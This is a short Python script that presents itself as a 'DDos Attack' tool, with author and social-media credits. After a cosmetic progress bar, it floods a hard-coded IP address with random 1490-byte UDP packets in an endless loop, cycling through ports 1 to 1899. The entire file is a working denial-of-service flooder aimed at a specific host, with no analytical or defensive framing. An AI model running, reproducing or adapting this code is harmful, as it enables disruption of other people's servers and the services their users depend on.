import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print ("Author   : Dee")
print ("github   : https://github.com/wendale1231")
print ("Facebook : https://www.facebook.com/babblefour")
ip = "35.185.157.82"
port = 80

os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
  try:
    sock.sendto(bytes, (ip,int(port)))
    sent += 1
    port = int(port) + 1
    print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
    if port == 1899:
      port = 1
  except:
  	print ("Error Last Attack")
